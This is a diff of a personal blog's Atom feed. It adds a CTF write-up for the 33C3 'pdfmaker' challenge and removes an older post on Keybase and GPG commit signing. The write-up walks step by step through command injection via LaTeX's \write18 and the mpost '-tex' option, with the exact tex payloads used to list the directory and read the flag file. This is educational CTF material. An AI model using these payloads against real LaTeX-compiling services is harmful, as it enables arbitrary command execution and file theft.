@@ -5,7 +5,7 @@
   
   <link href="https://yous.be/atom.xml" rel="self" type="application/atom+xml" />
   <link href="https://yous.be/" rel="alternate" type="text/html" />
-  <updated>2017-02-12T23:09:53+00:00</updated>
+  <updated>2017-02-20T03:13:39+00:00</updated>
   <id>https://yous.be//</id>
 
   
@@ -24,6 +24,168 @@
     </author>
   
 
+  
+  
+    <entry>
+      
+      <title type="html">33C3 CTF 2016: pdfmaker write-up</title>
+      
+      <link href="https://yous.be/2017/02/20/33c3-ctf-2016-pdfmaker-write-up/" rel="alternate" type="text/html" title="33C3 CTF 2016: pdfmaker write-up" />
+      <published>2017-02-20T02:21:38+00:00</published>
+      <updated>2017-02-20T02:21:38+00:00</updated>
+      <id>https://yous.be/2017/02/20/33c3-ctf-2016-pdfmaker-write-up</id>
+      <content type="html" xml:base="https://yous.be/2017/02/20/33c3-ctf-2016-pdfmaker-write-up/">&lt;h2&gt;pdfmaker (misc 75)&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Just a tiny
+&lt;a href=&quot;https://archive.aachen.ccc.de/33c3ctf.ccc.ac/uploads/pdfmaker-023c4ad945cb421a8bec1013bddf2bab5f77f77a.tar.xz&quot;&gt;application&lt;/a&gt;,
+that lets the user write some files and compile them with pdflatex. What can
+possibly go wrong?&lt;/p&gt;
+
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nc 78.46.224.91 24242&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;If you can’t download the application, please use this
+&lt;a href=&quot;/downloads/2017/02/20/pdfmaker-023c4ad945cb421a8bec1013bddf2bab5f77f77a.tar.xz&quot;&gt;link&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2&gt;What is the goal?&lt;/h2&gt;
+
+&lt;p&gt;There are some interesting parts in &lt;code class=&quot;highlighter-rouge&quot;&gt;pdfmaker_public.py&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;initConnection&lt;/code&gt;
+copies &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt; file into the &lt;code class=&quot;highlighter-rouge&quot;&gt;self.directory&lt;/code&gt; with the name of:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&quot;33C3&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;randint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;randint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Since the answer would be in the &lt;code class=&quot;highlighter-rouge&quot;&gt;33C3XXXXXXXXXXXXXXXX&lt;/code&gt; file, we should get the
+list of filenames in its directory. Note that &lt;code class=&quot;highlighter-rouge&quot;&gt;create&lt;/code&gt; method can create log,
+tex, sty, mp, bib files.&lt;/p&gt;
+
+&lt;h2&gt;Behavior of &lt;code class=&quot;highlighter-rouge&quot;&gt;\write18&lt;/code&gt;&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://gsis.kaist.ac.kr/cysec/daeheejang.html&quot;&gt;@daehee&lt;/a&gt; found this helpful
+link:
+&lt;a href=&quot;http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/&quot;&gt;“Pwning coworkers thanks to LaTeX”&lt;/a&gt;.
+According to the post, &lt;code class=&quot;highlighter-rouge&quot;&gt;\write18&lt;/code&gt; normally executes any program listed in
+&lt;code class=&quot;highlighter-rouge&quot;&gt;shell_escape_commands&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-conf highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;shell_escape_commands&lt;/span&gt; = \
+&lt;span class=&quot;n&quot;&gt;bibtex&lt;/span&gt;,&lt;span class=&quot;n&quot;&gt;bibtex8&lt;/span&gt;,\
+&lt;span class=&quot;n&quot;&gt;extractbb&lt;/span&gt;,\
+&lt;span class=&quot;n&quot;&gt;kpsewhich&lt;/span&gt;,\
+&lt;span class=&quot;n&quot;&gt;makeindex&lt;/span&gt;,\
+&lt;span class=&quot;n&quot;&gt;mpost&lt;/span&gt;,\
+&lt;span class=&quot;n&quot;&gt;repstopdf&lt;/span&gt;,\
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Note that &lt;code class=&quot;highlighter-rouge&quot;&gt;mpost&lt;/code&gt; is in there, and we can create mp file! As denoted by the
+link, &lt;code class=&quot;highlighter-rouge&quot;&gt;mpost&lt;/code&gt; takes the &lt;code class=&quot;highlighter-rouge&quot;&gt;-tex&lt;/code&gt; option for text labels, so we can execute
+arbitrary program.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;h2&gt;Exploitation&lt;/h2&gt;
+
+&lt;p&gt;I’ll explain the exploitation step by step.&lt;/p&gt;
+
+&lt;p&gt;At first, we create a tex file that executes &lt;code class=&quot;highlighter-rouge&quot;&gt;mpost&lt;/code&gt; on compilation. Note that
+we specified &lt;code class=&quot;highlighter-rouge&quot;&gt;bash -c ls&amp;gt;c.log&lt;/code&gt; to the &lt;code class=&quot;highlighter-rouge&quot;&gt;-tex&lt;/code&gt; option.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; create tex x
+\documentclass{article}\begin{document}
+\immediate\write18{mpost -ini &quot;-tex=bash -c ls&amp;gt;c.log&quot; &quot;x.mp&quot;}
+\end{document}
+\q
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Now we create a mp file.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; create mp x
+verbatimtex
+\documentclass{minimal}\begin{document}
+etex beginfig (1) label(btex blah etex, origin);
+endfig; \end{document} bye
+\q
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Then compile the previous tex file to invoke the &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; compile x
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Then we get the list of filename in the directory.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; show log c
+33C3566BA1153C636C68
+c.log
+makempx.log
+mpxxZmwh.tex
+x.aux
+x.log
+x.mp
+x.tex
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We have to read the content of &lt;code class=&quot;highlighter-rouge&quot;&gt;33C3566BA1153C636C68&lt;/code&gt; file, so let’s create one
+more tex file. &lt;code class=&quot;highlighter-rouge&quot;&gt;bash -c (cat${IFS}33C3566BA1153C636C68)&amp;gt;d.log&lt;/code&gt; will be executed
+on compilation.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; create tex y
+\documentclass{article}\begin{document}
+\immediate\write18{mpost -ini &quot;-tex=bash -c (cat${IFS}33C3566BA1153C636C68)&amp;gt;d.log&quot; &quot;x.mp&quot;}
+\end{document}
+\q
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Then compile it.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; compile y
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;So we can read the log.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; show log d
+33C3_pdflatex_1s_t0t4lly_s3cur3!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;So the flag is &lt;code class=&quot;highlighter-rouge&quot;&gt;33C3_pdflatex_1s_t0t4lly_s3cur3!&lt;/code&gt;.&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Yous</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="CTF" />
+      
+
+      
+
+      
+        <summary type="html">pdfmaker (misc 75) Just a tiny application, that lets the user write some files and compile them with pdflatex. What can possibly go wrong? nc 78.46.224.91 24242 If you can’t download the application, please use this link. What is the goal? There are some interesting parts in pdfmaker_public.py. initConnection copies flag file into the self.directory with the name of: &quot;33C3&quot; + &quot;%X&quot; % randint(0, 2**31) + &quot;%X&quot; % randint(0, 2**31) Since the answer would be in the 33C3XXXXXXXXXXXXXXXX file, we should get the list of filenames in its directory. Note that create method can create log, tex, sty, mp, bib files. Behavior of \write18 @daehee found this helpful link: “Pwning coworkers thanks to LaTeX”. According to the post, \write18 normally executes any program listed in shell_escape_commands: shell_escape_commands = \ bibtex,bibtex8,\ extractbb,\ kpsewhich,\ makeindex,\ mpost,\ repstopdf,\ Note that mpost is in there, and we can create mp file! As denoted by the link, mpost takes the -tex option for text labels, so we can execute arbitrary program.</summary>
+      
+
+      
+      
+    </entry>
+  
   
   
     <entry>
@@ -3861,174 +4023,6 @@ You may want to close only the current tab with &lt;code class=&quot;highlighter
       
         
         <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://yous.be/images/2014/07/22/pcapd1.jpg" />
-      
-    </entry>
-  
-  
-  
-    <entry>
-      
-      <title type="html">Using Keybase</title>
-      
-      <link href="https://yous.be/2014/07/17/using-keybase/" rel="alternate" type="text/html" title="Using Keybase" />
-      <published>2014-07-17T18:21:09+00:00</published>
-      <updated>2014-07-17T18:21:09+00:00</updated>
-      <id>https://yous.be/2014/07/17/using-keybase</id>
-      <content type="html" xml:base="https://yous.be/2014/07/17/using-keybase/">&lt;h2&gt;&lt;a id=&quot;keybase&quot;&gt;&lt;/a&gt;Keybase&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/2014/07/17/logo.png&quot; alt=&quot;Keybase&quot; title=&quot;Keybase&quot; /&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Keybase will be a public directory of publicly auditable public keys. All paired, for convenience, with unique usernames.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;I just created my &lt;a href=&quot;https://keybase.io&quot;&gt;Keybase&lt;/a&gt;. You can see my PGP public key on &lt;a href=&quot;https://keybase.io/yous&quot;&gt;keybase.io/yous&lt;/a&gt; and get the key via &lt;code class=&quot;highlighter-rouge&quot;&gt;https://keybase.io/yous/key.asc&lt;/code&gt;. Anyone can encrypt messages using my public key and then I could decrypt it using my private key and see the message with safety. All of these can be done in browser, in &lt;a href=&quot;https://keybase.io&quot;&gt;Keybase&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h2&gt;&lt;a id=&quot;keybase-proof&quot;&gt;&lt;/a&gt;Keybase Proof&lt;/h2&gt;
-
-&lt;p&gt;Keybase provides several ways to prove own identity of a Twitter account, a GitHub account, websites and a bitcoin address. Still it can be done on the browser, also you can use &lt;a href=&quot;https://keybase.io/docs/command_line&quot;&gt;command line&lt;/a&gt; for it. I proved &lt;a href=&quot;https://github.com/yous&quot;&gt;my GitHub&lt;/a&gt; by &lt;a href=&quot;https://gist.github.com/yous/149b0775d2ff02eac323&quot;&gt;keybase.md&lt;/a&gt; and &lt;a href=&quot;https://yous.be&quot;&gt;this site&lt;/a&gt; by &lt;a href=&quot;http://yous.be/keybase.txt&quot;&gt;keybase.txt&lt;/a&gt;. Also you can check it with command line like:&lt;/p&gt;
-
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;keybase id yous
-✔ public key fingerprint: 1BF1 AFE8 682E 45A2 11FF 2C0E 891B 7A9E 1D5A 400A
-✔ &lt;span class=&quot;s2&quot;&gt;&quot;yous&quot;&lt;/span&gt; on github: https://gist.github.com/149b0775d2ff02eac323
-✔ admin of yous.be via HTTP: http://yous.be/keybase.txt
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;!-- more --&gt;
-
-&lt;h2&gt;&lt;a id=&quot;directory-signing&quot;&gt;&lt;/a&gt;Directory Signing&lt;/h2&gt;
-
-&lt;p&gt;Command line program of Keybase provides &lt;code class=&quot;highlighter-rouge&quot;&gt;dir&lt;/code&gt; command to sign or verify directory. First you should install command line, see the &lt;a href=&quot;https://keybase.io/download&quot;&gt;installation docs&lt;/a&gt;. If you already have an account, just run &lt;code class=&quot;highlighter-rouge&quot;&gt;keybase login&lt;/code&gt;. You can also signup with &lt;code class=&quot;highlighter-rouge&quot;&gt;keybase signup&lt;/code&gt; in terminal.&lt;/p&gt;
-
-&lt;p&gt;At first, you should change directory to sign:&lt;/p&gt;
-
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Dropbox/Public
-~/Dropbox/Public &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;keybase dir sign
-info: Success! Wrote SIGNED.md from 224 found items
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;then &lt;code class=&quot;highlighter-rouge&quot;&gt;~/Dropbox/Public/SIGNED.md&lt;/code&gt; is generated. On same directory, veryfing directory is also possible with:&lt;/p&gt;
-
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~/Dropbox/Public &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;keybase dir verify
-info: Valid signature from keybase user yous
-✔ public key fingerprint: 1BF1 AFE8 682E 45A2 11FF 2C0E 891B 7A9E 1D5A 400A
-✔ &lt;span class=&quot;s2&quot;&gt;&quot;yous&quot;&lt;/span&gt; on github: https://gist.github.com/149b0775d2ff02eac323
-✔ admin of yous.be via HTTP: http://yous.be/keybase.txt
-info: Signed 4 minutes ago &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Fri Jul 18 2014 20:06:31 GMT+0900 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KST&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-info: Success! 1 signature&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; verified; 224 items checked
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2&gt;&lt;a id=&quot;using-custom-email&quot;&gt;&lt;/a&gt;Using Custom Email&lt;/h2&gt;
-
-&lt;p&gt;When you create public key on &lt;a href=&quot;https://keybase.io&quot;&gt;Keybase&lt;/a&gt;, default UID has name as &lt;code class=&quot;highlighter-rouge&quot;&gt;keybase.io/&amp;lt;username&amp;gt;&lt;/code&gt; and email as &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;username&amp;gt;@keybase.io&lt;/code&gt;. You can add UID with your real name and regular email. From &lt;a href=&quot;http://superuser.com/questions/293184/one-gnupg-pgp-key-pair-two-emails&quot;&gt;One GnuPG/PGP key pair, two emails?&lt;/a&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;gpg --edit-key &amp;lt;username&amp;gt;@keybase.io
-&lt;span class=&quot;gp&quot;&gt;gpg&amp;gt; &lt;/span&gt;adduid
-Real name: &amp;lt;name&amp;gt;
-Email address: &amp;lt;email&amp;gt;
-Comment: &amp;lt;comment or Return to none&amp;gt;
-Change &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;ame, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;omment, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;E&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;mail or &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;O&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;kay/&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Q&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;uit? o
-Enter passphrase: &amp;lt;passphrase&amp;gt;
-&lt;span class=&quot;gp&quot;&gt;gpg&amp;gt; &lt;/span&gt;uid &amp;lt;uid&amp;gt;
-&lt;span class=&quot;gp&quot;&gt;gpg&amp;gt; &lt;/span&gt;trust
-Your decision? 5
-Do you really want to &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;this key to ultimate trust? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y/N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; y
-&lt;span class=&quot;gp&quot;&gt;gpg&amp;gt; &lt;/span&gt;save
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;h2&gt;&lt;a id=&quot;signing-commits&quot;&gt;&lt;/a&gt;Signing Commits&lt;/h2&gt;
-
-&lt;p&gt;All the crypto of Keybase is performed with GPG, you can sign your tags and your commits. To setup your signing key, you need to get your key id by:&lt;/p&gt;
-
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;gpg --list-secret-keys | grep &lt;span class=&quot;s2&quot;&gt;&quot;^sec&quot;&lt;/span&gt;
-sec   4096R/1D5A400A 2014-07-16
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;1D5A400A&lt;/code&gt; part is your key id. Then simply you can set your signing key by:&lt;/p&gt;
-
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;git config --global user.signingkey 1D5A400A
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Also&lt;/p&gt;
-
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;git config --global commit.gpgsign &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;makes Git to sign every commits:&lt;/p&gt;
-
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;mkdir tmp &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;tmp
-&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;git init
-&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;foo &amp;gt; foo
-&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;git add foo
-&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;git commit -m &lt;span class=&quot;s2&quot;&gt;&quot;Test commit of foo&quot;&lt;/span&gt;
-
-You need a passphrase to unlock the secret key &lt;span class=&quot;k&quot;&gt;for
-&lt;/span&gt;user: &lt;span class=&quot;s2&quot;&gt;&quot;John Doe &amp;lt;john.doe@example.com&amp;gt;&quot;&lt;/span&gt;
-2048-bit RSA key, ID E79FBC2D, created 2014-07-16 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main key ID 1D5A400A&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;master &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root-commit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 6cdfc26] Test commit of foo
- 1 file changed, 1 insertion&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- create mode 100644 foo
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;After adding signed commits, you can see the signature of commits by using &lt;code class=&quot;highlighter-rouge&quot;&gt;--show-signature&lt;/code&gt; option:&lt;/p&gt;
-
-&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;git log --show-signature
-commit 6cdfc26eb2273fed14181fe4a09b6240323b8930
-gpg: Signature made 금  7/18 21:29:24 2014 KST using RSA key ID E79FBC2D
-gpg: Good signature from &lt;span class=&quot;s2&quot;&gt;&quot;John Doe &amp;lt;john.doe@example.com&amp;gt;&quot;&lt;/span&gt;
-gpg:                 aka &lt;span class=&quot;s2&quot;&gt;&quot;keybase.io/jdoe &amp;lt;jdoe@keybase.io&amp;gt;&quot;&lt;/span&gt;
-Author: John Doe &amp;lt;john.doe@example.com&amp;gt;
-Date:   Fri Jul 18 21:29:14 2014 +0900
-
-    Test commit of foo
-
- foo | 1 +
- 1 file changed, 1 insertion&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;For more information, see &lt;a href=&quot;http://mikegerwitz.com/papers/git-horror-story&quot;&gt;A Git Horror Story: Repository Integrity With Signed Commits&lt;/a&gt; by Mike Gerwitz.&lt;/p&gt;
-
-&lt;h2&gt;&lt;a id=&quot;contact-me&quot;&gt;&lt;/a&gt;Contact Me&lt;/h2&gt;
-
-&lt;p&gt;So, now feel free to contact me via &lt;a href=&quot;https://keybase.io/yous&quot;&gt;keybase.io/yous&lt;/a&gt; and other &lt;a href=&quot;/about&quot;&gt;contacts&lt;/a&gt;. The source of this site is available on &lt;a href=&quot;https://github.com/yous/yous.github.io&quot;&gt;GitHub&lt;/a&gt;, forks and pull requests are welcome!&lt;/p&gt;</content>
-
-      
-      
-      
-      
-      
-
-      
-        <author>
-            <name>Yous</name>
-          
-          
-        </author>
-      
-
-      
-        <category term="Technology" />
-      
-
-      
-
-      
-        <summary type="html">Keybase Keybase will be a public directory of publicly auditable public keys. All paired, for convenience, with unique usernames. I just created my Keybase. You can see my PGP public key on keybase.io/yous and get the key via https://keybase.io/yous/key.asc. Anyone can encrypt messages using my public key and then I could decrypt it using my private key and see the message with safety. All of these can be done in browser, in Keybase. Keybase Proof Keybase provides several ways to prove own identity of a Twitter account, a GitHub account, websites and a bitcoin address. Still it can be done on the browser, also you can use command line for it. I proved my GitHub by keybase.md and this site by keybase.txt. Also you can check it with command line like: $ keybase id yous ✔ public key fingerprint: 1BF1 AFE8 682E 45A2 11FF 2C0E 891B 7A9E 1D5A 400A ✔ &quot;yous&quot; on github: https://gist.github.com/149b0775d2ff02eac323 ✔ admin of yous.be via HTTP: http://yous.be/keybase.txt</summary>
-      
-
-      
-      
-        
-        <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://yous.be/images/2014/07/17/logo.png" />
       
     </entry>
   
